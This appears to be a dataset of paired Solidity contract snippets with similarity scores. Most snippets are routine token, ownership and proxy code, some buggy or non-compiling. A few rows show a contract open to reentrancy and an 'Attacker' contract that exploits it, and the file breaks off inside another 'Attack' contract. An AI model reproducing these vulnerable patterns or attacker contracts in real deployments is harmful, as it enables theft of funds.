   function issueTokensToBuyer() internal  {

      uint256 balance = lamdenTau.balanceOf(this);
      require(balance > 0);
      assert(lamdenTau.transfer(buyer, balance));
      IssueTokens(buyer, priceInWei, balance);
   }

   function endTokenSale() onlyOwner {

      uint256 balance = lamdenTau.balanceOf(this);
      require(balance > 0);
      assert(lamdenTau.transfer(owner, balance));
   }
}"
"contract Test {
    address[] public addrs;
    mapping (address => uint256) public something;
    mapping (address => bool) public registered;
    function registerSomething(address _addr, uint256 _value) {
        require(!registered[_addr]);
        registered[_addr] = true;
        addrs.push(_addr);
        something[_addr] = _value;
    }
}",0.6729501791733605,"contract AddressBook {



    mapping(address => uint32) public uidOf;

    mapping(uint32 => address) public addrOf;



    uint32 public topUid;



    function address_register(address _addr) internal {

        require(uidOf[_addr] == 0, 'addr exsists');

        uint32 uid = ++topUid;

        uidOf[_addr] = uid;

        addrOf[uid] = _addr;

    }

}"
"contract Contract2 {

    Contract1 public contract1 = new Contract1();

    function func() public returns (uint32, uint32) {

        uint32[2] memory ret;

        address dest = address(contract1);

        bytes4 selector = contract1.func.selector;
        

        bytes memory data = abi.encodeWithSelector(selector, uint256(789), uint8(123));
        (bool success, ) = dest.call(data);
        require(success);

        assembly {
            let size := returndatasize
            returndatacopy(ret, 0, size)
        }
        return (ret[0], ret[1]);
    }
}",0.6296884834223659,"contract Proxy {

  function implementation() public view returns (address);



  

  function () payable public {

    address impl = implementation();

    require(impl != address(0));

    bytes memory data = msg.data;



    assembly {

      let result := delegatecall(gas, impl, add(data, 0x20), mload(data), 0, 0)

      let size := returndatasize



      let ptr := mload(0x40)

      returndatacopy(ptr, 0, size)



      switch result

      case 0 { revert(ptr, size) }

      default { return(ptr, size) }

    }

  }

}"
"contract Contract {
    uint[] public large_array;

    function read(uint cursor, uint length) public view returns (uint[] memory) {
        uint[] memory array = new uint[](length);
        for (uint i = cursor; i < cursor+length; i++) {
            array[i] = large_array[i];
        }
        return array;
    }
}",0.6159538961424518,"contract BalanceChecker {

  function balances(address[] calldata users) external view returns (uint[] memory) {
    uint[] memory addrBalances = new uint[](users.length);
    
    for(uint i = 0; i < users.length; i++) {
        addrBalances[i] = users[i].balance;
    }
  
    return addrBalances;
  }

}"
"contract Case1 {

    struct BB{
        mapping (uint => address) map_2;
    }

    mapping (uint => BB) map_1; 

    function getter(uint structId, uint mapId) public view returns(address) {
        return map_1[structId].map_2[mapId];
    }  
}",0.6237195279454623,"contract FeeInterface {
    function rateOf (address token) public view returns (uint);
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract B {
    function create() public {
        A newContract = new A();
    }
}",0.6436968210160234,"contract callBackContract {

    function __response(uint _price) public;

}"
"contract InterfaceOfB {
        function g(bool) returns (bool);
}",0.6823135006907421,"contract TUB {
    function off() public returns(bool);
}"
"contract A is InterfaceOfA {
        InterfaceOfB b;
        function f(uint _input) returns (uint) {
                b.g(true);
                return 3;
        }
}",0.6654658497799388,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract B is InterfaceOfB {
        InterfaceOfA a;
        function g(bool _input) returns (bool) {
                a.f(0);
                return false;
        }
}",0.6246004589917111,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract B is IB {
    IA public a;
    function set(IA _a) external {a = _a;}
    
}",0.6025372057491915,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract A is Owned{ 
  B public b;
  function A()
  Owned(msg.sender)
  { 
    b = new B(msg.sender); 
  }
}",0.6500759536653333,"contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}"
"contract B is Owned  {
  address parent;
  function B(address _owner)
  Owned(_owner)
  {
    parent = msg.sender;
  }  
}",0.6869420343653839,"contract OwnableStorage {

  address public owner;

  function OwnableStorage() internal {
    owner = msg.sender;
  }

}"
"contract game {

 struct users{
     string name;
     uint level;
     uint score;
 }

 mapping(uint => users[]) mulusers;

 function addusers (uint id, string _name, uint _level, uint _score) public {
     users memory user= users(_name,_level,_score); 
     mulusers[id].push(user);
 }

 function getusers (uint _id) public view returns (string){

    uint index= mulusers[_id].length;

     for(uint i=0; i<index; i++){       
       return mulusers[_id][i].name; 
     }   
  }   
}",0.6208263675915304,"contract UserName {



  mapping (address => mapping (uint => string)) public userDict;



  event OnNameChanged(uint indexed _guid, address indexed _who, string _newName);



  function changeName(uint _guid, string _newName) public {

    userDict[msg.sender][_guid] = _newName;

    OnNameChanged(_guid, msg.sender, _newName);

  }



  function nameOf(uint _guid, address _who) view public returns (string) {

    return userDict[_who][_guid];

  }

}"
"contract C {
    uint256 public value = 500;
    address b;

    constructor(address _b) {
        b = _b;
    }

    function delegate() public {
        address orgB = b;
        if (b.a != address(0)) {
            b = b.a;
        }
        orgB.delegatecall(bytes4(keccak256(""delegate()"")));
        b = orgB;
    }
}",0.6113145284473628,"contract TokenController {

    bytes4 public constant INTERFACE = bytes4(keccak256(""TokenController""));



    function allowTransfer(address _sender, address _from, address _to, uint256 _value, bytes _purpose) public returns (bool);

}"
"contract Mutex {
    bool locked;
    modifier noReentrancy() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }

    function Mutex() public payable { }

    function canBeAttacked() public returns (uint) {
        require(msg.sender.call.value(1 ether)());
        return 7;
    }

    
    function f() public noReentrancy returns (uint) {
        require(msg.sender.call());
        return 7;
    }
}",0.6577327746142102,"contract Lockable is Owned {
    bool public isLocked = false;
    
    modifier checkLock(address from) {
        require(!isLocked || from == owner);
        _;
    }
    
    function lock() public onlyOwner returns (bool success) {
        isLocked = true;

        return true;
    }
    function unLock() public onlyOwner returns (bool success) {
        isLocked = false;

        return true;
    }
}"
"contract Attacker {
    function () public payable {
        if (msg.sender.balance >= 1 ether) {
            Mutex(msg.sender).canBeAttacked();
        }
    }

    function payment(Mutex mutex) public {
        mutex.canBeAttacked();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}",0.65348868013258,"contract MyCompanyWallet is Ownable {

    address public Owner;

    

    function setup() public payable {

        if (msg.value >= 0.5 ether) {

            Owner = msg.sender;

        }

    }

    

    function withdraw() public {

        if (isOwner()) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function() public payable { }

}"
"contract Div {

    function divider(uint numerator, uint denominator, uint precision) public pure returns(uint) {
        return (numerator*(uint(10)**uint(precision+1))/denominator + 5)/uint(10);
    }
}",0.6851944269422043,"contract Revolution {

  function dividendsPercent() public view returns(uint numerator, uint denominator);

  function latestPayout() public view returns(uint timestamp) ;

}"
"contract TestCoin {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function TestCoin(uint256 initialSupply) public {
    totalSupply = initialSupply;
    balanceOf[msg.sender] = totalSupply;
  }
}",0.6824853002556222,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  uint256 totalSupply_;

  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

}"
"contract Autos {

address owner;
address[] members;
uint counter = 1;
mapping (address => bool) public owners;

constructor() public {
    owner = msg.sender;
    members = [0xca35b7d915458ef540ade6068dfe2f44e8fa733c,0x14723a09acff6d2a60dcdf7aa4aff308fddc160c];
    for (uint i=0; i lessthan members.length ; i++)
    {
     owners[members[i]]=true;
   }
}

function incCounter() onlyOwner {
       counter++;
   }
    function showCount() view returns(uint){
        return counter;
    }

modifier onlyOwner {
    require(owners[msg.sender]);
_;

}  
}",0.6491300735951874,"contract Ownable is WaConfig {

    address public ceo;

    

    event LogChangeCEO(address indexed oldOwner, address indexed newOwner);

    

    modifier onlyOwner {

        require(msg.sender == ceo);

        _;

    }

    

    constructor() public {

        ceo = msg.sender;

    }

    

    function changeCEO(address _owner) onlyOwner public returns (bool) {

        require(_owner != address(0));

        

        emit LogChangeCEO(ceo, _owner);

        ceo = _owner;

        

        return true;

    }



    function isOwner(address _owner) internal view returns (bool) {

        return ceo == _owner;

    }

}"
"contract B is A {
    address private owner;
    uint state;
    constructor() public {
        owner = msg.sender;
        state = 0;
    }
    function getOwner() internal returns(address) {
        return owner;
    }
    function performOperation() internal {
        state = state + 1;
    }
}",0.6926951456569778,"contract Owned is DBC {

    

    address public owner;

    

    function Owned() { owner = msg.sender; }

    function changeOwner(address ofNewOwner) pre_cond(isOwner()) { owner = ofNewOwner; }

    

    function isOwner() internal returns (bool) { return msg.sender == owner; }

}"
"contract Test {

    enum assetState{something}

    mapping(uint256 => asst) assetsById;

    struct asst {
        uint256 assetId;
        uint256 next;
        uint256 prev;
        uint256 timestampCreation;
        address assetOwner;
        address issuer;
        string content;
        uint256 sellPrice;
        assetState state;
    }

    function getAssetStructById(uint256 assetId) public view returns (asst _asset) {
        return (assetsById[assetId]);
    }

    function tryIt(uint id) public view returns(bool success) {
        asst memory a = getAssetStructById(id); 
        return true;
    }
}",0.6135788174191613,"contract NatminVesting is Ownable {

    struct Vesting {        

        uint256 amount;

        uint256 endTime;

    }

    mapping(address => Vesting) internal vestings;



    function addVesting(address _user, uint256 _amount, uint256 _endTime) public ;

    function getVestedAmount(address _user) public view returns (uint256 _amount);

    function getVestingEndTime(address _user) public view returns (uint256 _endTime);

    function vestingEnded(address _user) public view returns (bool) ;

    function endVesting(address _user) public ;

}"
"contract OtherContract {
    function otherMethod(address _to, uint _price);
}",0.696203991635386,"contract MCTContract {
  function mintTokens(address _to, uint256 _amount);
}"
"contract Betting is usingOraclize {

event Transfer(address _from, uint256 _value);
function Betting() {

}

function () payable {
   Transfer(msg.sender, msg.value);
}

}",0.6621002646718142,"contract TokenUSDT {
  function transferFrom(address _from, address _to, uint256 _value) public  {}
  function transfer(address _to, uint256 _value) public  {}
}"
"contract SP {
    IValidator validator;
    ...
    function verifyHash(bytes32 hash) external view returns (address) {
        return validator.verifyHash(hash);
    }
}",0.6090644873766898,"contract GetBAU is DataCaller {

    function getBAU(bytes32 _key, address _addr) internal view returns(uint256) {

        return data.bau(_key, _addr);        

    }

}"
"contract TruffleDebug {

  function Deposit (uint256 timeout, bytes32 hash, address recipient) public payable returns (uint256)  {
       emit AcceptCommitted(timeout, hash, recipient);
       return 1;
   }

   event AcceptCommitted(uint256 indexed timeout, bytes32 indexed hash, address indexed recipient);

}",0.6102693514183258,"contract ERC20Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Burn(address indexed from, uint256 value);
}"
"contract MyToken {
    mapping (address => uint) balanceOf;

    event CoinTransfer(address indexed _from, address indexed _to, uint256 _value);

    function MyToken() {
        balanceOf[msg.sender] = 21000000;
    }

    function sendCoin(address receiver, uint amount) returns(bool sufficient) {
        if (balanceOf[msg.sender] < amount) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[receiver] += amount;
        CoinTransfer(msg.sender, receiver, amount);
        return true;
    }

    function transfer(address from, address to, uint amount) returns(bool sufficient) {
        if (balanceOf[from] < amount) return false;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        CoinTransfer(from, to, amount);
        return true;
    }

    function getBalance(address addr) returns(uint) {
        return balanceOf[addr];
    }
}",0.6824846027095823,"contract ERC20Token {

    
    event Transfer(address indexed _from, address indexed _to, uint256 _amount);

    
    event Approval(address indexed _owner, address indexed _recipient, uint256 _amount);

    function totalSupply() public constant returns (uint256);
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _recipient, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _recipient) public constant returns (uint256 remaining);
}"
"contract PermService {
    mapping (address => bool) customerPaid;
    address vendor;

    function PermService() {
        vendor = msg.sender;
    }

    function buy(address tokenContractAddress) returns (bool success) {
        if (customerPaid[msg.sender]) {
            
            return true;
        }
        MyToken mt = MyToken(tokenContractAddress);
        if (mt.getBalance(msg.sender) < 5) {
            throw;
            return false;
        }
        mt.transfer(msg.sender, vendor, 5);
        customerPaid[msg.sender] = true;
        return true;
    }
}",0.6259183195544376,"contract GBank {

    address creator;

    mapping (address => uint) balances;

    function GBank(uint startAmount) {
        balances[msg.sender] = startAmount;
        creator = msg.sender;
    }

    function getBalance(address a) constant returns (uint) {
        return balances[a];
    }

    function transfer(address to, uint amount) {

        
        if (msg.sender == to) {
            throw;
        }

        
        if (amount > balances[msg.sender]) {
            throw;
        }

        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}"
"contract OnetimeService {
    address vendor;

    function OnetimeService() {
        vendor = msg.sender;
    }

    function buy(address tokenContractAddress) returns (bool success) {
        MyToken mt = MyToken(tokenContractAddress);
        if (mt.getBalance(msg.sender) < 2) {
            return false;
        }
        mt.sendCoin(vendor, 2);

        return true;
    }

}",0.6286822243430539,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
"contract Mutex {
  bool locked;
modifier noReentrancy() {
    require(!locked);
    locked = true;
    _;
    locked = false;
}

  function canBeAttacked() public returns (uint) {
    require(msg.sender.call.value(1 ether)());
   return 7;
  }


  function f() public noReentrancy returns (uint) {
    require(msg.sender.call());
   return 7;
  }
}",0.6127940601823935,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract Contract {
 string ipfsHash;
 mapping (address => string[]) userToFiles;
 event (string ipfsHash, address owner) filesUploaded;

 function setHash(string x) public {
   ipfsHash = x;
   
   
 }

 function getHash() public view returns (string x) {
   return ipfsHash;
 }
}",0.626279249701572,"contract Register is Pausable {
    mapping(address => string) public registry;

    
    function addUser(string info) public whenNotPaused {
        registry[msg.sender] = info;
    }
   
    
    function getInfo(address ethAddress) public constant returns (string) {
        return registry[ethAddress];
    }
}"
"contract Test {
    uint[] public arr;
    uint[] public arr1;

    constructor() public {
        arr = [1];
        arr1 = [2];
    }

    function setMe() public {
        TestLibrary.setMyArray(arr, arr1);
    }
}",0.6048320998226887,"contract Pause is Owned {
	uint8 public pause;

	constructor() public {
		pause = 0;
	}

	function setPause(uint8 _pause) onlyOwner public {
		pause = _pause;
	}
}"
"contract Test {

    address public constant MY_ADDRESS = msg.sender;

    function check() constant returns (address) {
        return MY_ADDRESS;
    }
}",0.6869127099108835,"contract IOwnership {

    
    function isOwner(address _account) constant returns (bool);


    
    function getOwner() constant returns (address);
}"
"contract ColorPallet {

  address public owner; 

  
  bytes32[] public colors;

  mapping(address => uint) public userColorChoices;
  mapping(address => bool) public userHasSelectedColor;

  modifier onlyOwner() {
    if(msg.sender != owner) throw;
    _;
  }

  function ColorPallet() {
    owner = msg.sender;
  }

  
  function newColor(bytes32 colorName) 
    onlyOwner
    returns(uint index) 
  {
    colors.push(colorName);
    return colors.length-1;
  }

  

  function setUserColor(uint colorId) 
    public
  {
    if(colorId >= getColorCount()) throw; 
    userColorChoices[msg.sender] = colorId; 
    userHasSelectedColor[msg.sender] = true;
  }

  function getColorCount() 
    public
    constant
    returns(uint count) 
  {
    return colors.length;
  }

  function newUserContract() 
    public
    returns(address newUserContract)
  {
    User u = new User(msg.sender, this);  
    return u;
  }
}",0.629148505337872,"contract MultiOwners {

    event AccessGrant(address indexed owner);
    event AccessRevoke(address indexed owner);
    
    mapping(address => bool) owners;
    address public publisher;

    function MultiOwners() public {
        owners[msg.sender] = true;
        publisher = msg.sender;
    }

    modifier onlyOwner() { 
        require(owners[msg.sender] == true);
        _; 
    }

    function isOwner() public constant returns (bool) {
        return owners[msg.sender] ? true : false;
    }

    function checkOwner(address maybe_owner) public constant returns (bool) {
        return owners[maybe_owner] ? true : false;
    }

    function grant(address _owner) onlyOwner public {
        owners[_owner] = true;
        AccessGrant(_owner);
    }

    function revoke(address _owner) onlyOwner public {
        require(_owner != publisher);
        require(msg.sender != _owner);

        owners[_owner] = false;
        AccessRevoke(_owner);
    }
}"
"contract User {

  address public owner; 
  address public pallet;
  uint    public myColor;

  ColorPallet c;

  modifier onlyOwner() {
    if(msg.sender != owner) throw;
    _;
  }

  function User(address userOwner, address pallet) {
    
    owner = userOwner;
    
    c = ColorPallet(pallet);
  }

  function selectColor(uint colorId) 
    
    returns(bool success)
  {
    myColor = colorId;                      
    c.setUserColor(colorId);                
    return true;
  }

}",0.6557959799886366,"contract CENAuth{

	address public owner;

	constructor () public{

		owner = msg.sender;

	}

	event LogOwnerChanged (address msgSender );



	

	modifier onlyOwner{

		assert(msg.sender == owner);

		_;

	}



	function setOwner (address newOwner) public onlyOwner returns (bool){

		if (owner == msg.sender){

			owner = newOwner;

			emit LogOwnerChanged(msg.sender);

			return true;

		}else{

			return false;

		}

	}



}"
"contract A {

   uint public bidValue;
   address public bidder;

   function bid() public payable {
     bidValue = msg.value;    
     bidder = msg.sender;
   }
}",0.6865311215537448,"contract PayChannel {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function () payable public {
        owner.transfer(msg.value);
    }
}"
"contract B {    

  function aBid(address aAddress) public payable{
    A a = A(aAddress);    
    a.bid.value(msg.value)();
  }
}",0.6224931038412465,"contract IChest {
        function purchaseFor(address user, uint count, address referrer) public payable;

}"
"contract C1 {
    uint256 foo;
    function setFoo(uint256 value) external {
        foo = value;
    }
}",0.6656253491895738,"contract MomLike {
    function setCap(uint256) external;
    function setFee(uint256) external;
}"
"contract Foo {

  function getPatient(uint id) public view returns (patient memory) {
    return patients[id];
  }
}",0.6760059781495716,"contract Clock is IClock {
  function getTime() view public returns (uint256) {
    return block.timestamp;
  }
}"
"contract Child {

   string public a;

   event LogCreatedBy(address creator, string arg);

   constructor (string arg) public payable { 
       a = arg;
       emit LogCreatedBy(msg.sender, a);
   }
}",0.6290388253981634,"contract Notifier {
    constructor () public {}
    
    event Notify(address indexed who, uint256 value, bytes data);

    function() public payable {
        emit Notify(msg.sender, msg.value, msg.data);
    }
}"
"contract Factory {

    event LogCreatedChild(address sender, string arg, address created);

    function createChild(string arg) public payable {
        address issueContract = (new Child).value(msg.value)(arg);
        emit LogCreatedChild(msg.sender, arg, issueContract);
    }
}",0.6156345452684134,"contract MultiSigFactory {
    
    event Create(address indexed caller, address createdContract);

    function create(address[] owners, uint256 required) returns (address wallet){
        wallet = new MultiSigStub(owners, required); 
        Create(msg.sender, wallet);
    }
    
}"
"contract X {
    event E(bytes data);

    function b(bytes memory _b) public {
        emit E(msg.data);
    }
}",0.6403819916558493,"contract Lottery

{

    event Bid(address sender);



    function bid() public

    {

        emit Bid(msg.sender);

    }

}"
"contract CrowdSale {

    ERC20Token token;

    constructor (uint256 _hivePerEther, address _wallet, address _token, uint256 _openingTime, uint256 _closingTime) public {
        token = ERC20Token(_token);
        ...
    }

    function getTokenBalance(address _addr) external view returns (uint256 _balance) {
         _balance = token.balanceOf(_addr);
    }
}",0.6712398857667482,"contract TokenMultiSearch {
    function GetMultiBalance(address erc20, address[] searches) public constant returns (uint256[] balances)  
    {
        uint256 n = searches.length;
        balances = new uint256[](n);
        
        ERC20Interface token = ERC20Interface(erc20);
        
        for (uint256 i = 0; i < n ; i++)
        {
            balances[i] = token.balanceOf(searches[i]);
        }
    }
}"
"contract FeedConsumer {
    DataFeed feed;
    uint errorCount;
    function rate(address token) public returns (uint value, bool success) {
        
        
        require(errorCount < 10);
        try feed.getData(token) returns (uint v) {
            return (v, true);
        } catch Error(string memory ) {
            
            
            
            errorCount++;
            return (0, false);
        } catch (bytes memory ) {
            
            
            
            errorCount++;
            return (0, false);
        }
    }
}",0.6213299984420384,"contract PricingStrategy {

  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

 
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract Test {
    uint256 public v1;
    string public v2;

    function Test(uint256 _v1, string _v2) {
        v1 = _v1;
        v2 = _v2;
    }
}",0.6147427086120923,"contract Foo {
  string public foo;

  function getFoo() public {
    string memory _foo = foo;
    string memory _bar = foo;
  }
}"
"contract ConstantAndTransaction {

    uint trivial;

    function getTrivial() public view returns(uint) {
        
        
        return trivial;
    }

    function add(uint x) public {
        
        
        trivial += getTrivial() + x;
    }
}",0.6786872338680323,"contract Upgradable {

    function upgrade() public;

    function getRequiredTokens(uint _level) public pure returns (uint);

    function getLevel() public view returns (uint);

}"
"contract LocalEthereum {

    address public owner;
    event Created(adress indexed _from, bytes32 _tradeHash);
    function createEvent() onlyOwner external {
        Created(msg.sender, 0x01);
    } 
}",0.6200708786564377,"contract Owned {

    address public owner = msg.sender;



    modifier isOwner {

        assert(msg.sender == owner); _;

    }



    function changeOwner(address account) external isOwner {

        owner = account;

    }

}"
"contract C {
  function foo() returns(int) {
    if(msg.sender != owner) {
      Error(""User not authorized"")
      return -1111;  
    }
    
  }
}",0.6183921813746469,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract C {
function g(uint a) returns (uint ret) { return f(); }
function f() returns (uint ret) { return g(7) + f(); }
}",0.6401312657113568,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract Test {
    string public constant text = ""Hello world!"";

    function isEqualTo(string memory myString) public pure returns(bool) {
        return (keccak256(abi.encode(text)) == keccak256(abi.encode(myString)));
    }
}",0.6133421281944,"contract HelloWorld{
    string input = ""Hello world."";

    function sayHello() view public returns (string) {
        return input;
    }

    function setNewGreeting(string greeting) public {
        input = greeting;
    }
}"
"contract CrowdFund {

    uint deadline;
    uint goal;
    uint raised;
    address owner;

    function CrowdFund(uint _deadline, uint _goal) {
        owner = msg.sender;
        deadline = _deadline;
        goal = _goal;
    }

    function checkGoalReached() public constant returns(bool isIndeed) {
        return (raised >= goal);
    }

    function checkDeadlinePassed() public constant returns(bool hasIndeed) {
        return(now > deadline);
    }

}",0.6259702816252186,"contract ERC20 is ERC20Basic {

  
  function allowance(address owner, address spender) public constant returns (uint);

  
  function transferFrom(address _from, address _to, uint _value) public returns(bool ok);

  
  function approve(address _spender, uint _value) public returns(bool ok);

  
  event Approval(address indexed owner, address indexed spender, uint value);
}"
contract C { uint[] public numbers; function initNumbers() { numbers.push(1); numbers.push(2); } function stateChanger(uint a) { numbers.push(a); }      },0.6906956416086392,"contract Number {
    uint number;
    
    function Number(uint _number) public {
    number=_number;
    }
    function change(uint _number) public {
    number=_number;
    }
}"
"contract D {

    function delegatecallSetN(address _e, uint _n) public returns (uint, bytes32, uint, string memory) {
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256(""setN(uint256)"")), _n);
        (bool success, bytes memory returnedData) = _e.delegatecall(data);
        require(success);
        return abi.decode(returnedData, (uint, bytes32, uint, string));
    }
}",0.6172825498956387,"contract TokenInterface is ERC20Interface {

    function symbol() public view returns (string memory);

    function name() public view returns (string memory);

    function decimals() public view returns (uint8);

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success);

}"
"contract DApp {
    uint256 acconto;
    uint256 saldo;
    address committent;
    address technician;
    bool started;
    uint256 timeFinish;

    modifier onlyCom() { require(msg.sender == committent); _; }
    modifier onlyAfter(uint _time) { require(now > _time); _; }

    constructor (uint256 _acconto, uint256 _saldo, address _technician) public {
        technician = _technician;
        committent = msg.sender;
        acconto = _acconto;
        saldo = _saldo;
        started = false;
    }

    function start(uint256 _time) public onlyCom() payable {
        require(started == false);
        require(msg.value >= acconto + saldo);
        started = true;
        timeFinish = now + _time;
        technician.transfer(acconto);
    }

    function good() public onlyCom() { selfdestruct(technician); }
    function bad() public onlyCom() onlyAfter(timeFinish) { selfdestruct(committent); }
}",0.6017217036325343,"contract GexCryptoIco is owned {

    uint public saleStart;
    uint public saleEnd;
    uint256 public minInvestment;

    function GexCryptoIco() {
        saleStart = 1517301413;
        saleEnd = 1519862400;
        minInvestment = (1/10) * (10 ** 18);
    }

    event EtherTransfer(address indexed _from,address indexed _to,uint256 _value);

    function changeMinInvestment(uint256 _minInvestment) onlyOwner {
        minInvestment = _minInvestment;
    }

    function withdrawEther(address _account) onlyOwner payable returns (bool success) {
        require(_account.send(this.balance));

        EtherTransfer(this, _account, this.balance);
        return true;
    }

    function destroyContract() {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }

    function () payable {
        if (saleStart < now && saleEnd > now) {
            require(msg.value >= minInvestment);
        } else {
            revert();
        }
    }

}"
"contract test {
    struct BB {
        mapping(uint => AA) map_2;
    }
    struct AA{
        uint val;
    }
    mapping(uint => BB) map_1;

    function test() public {
        map_1[1].map_2[1].val = 10;
    }

    function maping() public view returns(uint) {
        return map_1[1].map_2[1].val;
    }
}",0.6321422804131568,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract PaymentGateway {

    
    
    
    

    enum State {
        PENDING,
        ACCEPTED,
        REFUNDED
    }

    struct Transaction {
        uint            id;
        address         from;
        uint256         amount;
        State           state;
        uint            date;
    }

    
    
    
    address public owner;
    uint  constant AUTO_REFUND_AFTER = 5 days;
    uint public sequence;
    uint public nbPendingTrasanction = 0;
    mapping(uint => Transaction) db;
    uint256 pendingVolume = 0;
    uint256 availableVolume = 0;
    


    
    
    

    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }
    


    
    
    
    event received_payment(uint id, address from, uint amount, State state, uint date);
    


    
    
    
    function PaymentGateway() {
        owner = msg.sender;
        sequence = 0;  
    }
    


    
    
    

    
    function getPendingTransactions() constant returns (uint[]) {

        if(nbPendingTrasanction == 0) {
            return new uint[](0);
        }

        uint[] memory policyIDArray  = new uint[](nbPendingTrasanction);

        uint index = 0;
        for (var id = 0; id < sequence ; id++) {
            Transaction memory t  = db[id];

            if(t.state == State.PENDING) {
                policyIDArray[index] = t.id;
                index++;
            }
        }

        return (policyIDArray);
    }

    
    function getTransactionDetail(uint _id) constant returns (uint, address, uint256, State, uint) {
        return (db[_id].id, db[_id].from, db[_id].amount, db[_id].state, db[_id].date);
    }
    


    
    
    

    
    function receivePayment() payable {

        Transaction memory t; 
        t.id             = sequence;
        t.from           = msg.sender;
        t.amount         = msg.value;
        t.state          = State.PENDING;
        t.date           = now;

        
        db[t.id]  = t;

        
        sequence++; 

        
        nbPendingTrasanction++;

        
        pendingVolume += msg.value; 

        
        received_payment(t.id, t.from, t.amount, t.state, t.date);
    }

    
    function acceptPayment(uint _id) onlyOwner {
         db[_id].state = State.ACCEPTED;

        
        
        availableVolume += db[_id].amount; 
        pendingVolume -= db[_id].amount; 


        
        nbPendingTrasanction--;
    }


    
    function refundPayment(uint _id) onlyOwner {

        
        require(db[_id].amount != 0);

        
        require(this.balance >= db[_id].amount);

        
        db[_id].state = State.REFUNDED;


        
        
        pendingVolume -= db[_id].amount;

        
        nbPendingTrasanction--;

        
        assert(db[_id].from.send(db[_id].amount));
    }

    
    function transfer(address _to, uint256 _amount) onlyOwner {
         
    }


    
    function transferOwnership(address _newOwner) onlyOwner {
        owner = _newOwner;
    }

    



    
    
    

    


}",0.6173401654138688,"contract ICO is owned {

  ERC20 public tokenSC;
  address      treasury;
  uint public  start;     
  uint public  duration;  
  uint public  tokpereth; 

  function ICO( address _erc20,
                address _treasury,
                uint _startSec,
                uint _durationSec,
                uint _tokpereth ) public
  {
    require( isContract(_erc20) );
    require( _tokpereth > 0 );

    if (_treasury != address(0)) require( isContract(_treasury) );

    tokenSC = ERC20( _erc20 );
    treasury = _treasury;
    start = _startSec;
    duration = _durationSec;
    tokpereth = _tokpereth;
  }

  function setTreasury( address treas ) public onlyOwner { treasury = treas; }
  function setStart( uint newstart ) public onlyOwner { start = newstart; }
  function setRate( uint rate ) public onlyOwner { tokpereth = rate; }
  function setDuration( uint dur ) public onlyOwner { duration = dur; }

  function() public payable {
    require( msg.value >= 500 finney );
    if (now < start || now > (start + duration)) revert();

    
    
    
    
    uint qty =
      multiply( divide( multiply( msg.value, tokpereth ),
                        100000000000000000000),
                (bonus() + 100) );

    if (qty > tokenSC.balanceOf(address(this)) || qty < 1)
      revert();

    tokenSC.transfer( msg.sender, qty );

    if (treasury != address(0)) treasury.transfer( msg.value );
  }

  
  function claimUnsold() public onlyOwner {
    if ( now < (start + duration) ) revert();

    tokenSC.transfer( owner, tokenSC.balanceOf(address(this)) );
  }

  function withdraw( uint amount ) public onlyOwner returns (bool) {
    require ( treasury == address(0) && amount <= this.balance );
    return owner.send( amount );
  }

  
  function bonus() pure private returns(uint) { return 0; }

  function isContract( address _a ) constant private returns (bool) {
    uint ecs;
    assembly { ecs := extcodesize(_a) }
    return ecs > 0;
  }

  
  
  function multiply(uint256 a, uint256 b) pure private returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function divide(uint256 a, uint256 b) pure private returns (uint256) {
    return a / b;
  }
}"
"contract Aa {

    uint public myuint;

    function set(uint _var) public {
            require(_var == 5 || _var == 99, ""Not 5 or 99!"");
        myuint = _var;
    }

    function get() public view returns (uint){
        return myuint;
    }
}",0.6597756812326768,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract Attack {
    Guess g;
    event LogSuccess(address sender, bool success);
    constructor(address guessIt) public {
        g = Guess(guessIt);
    }
    function nostrodamus() public {
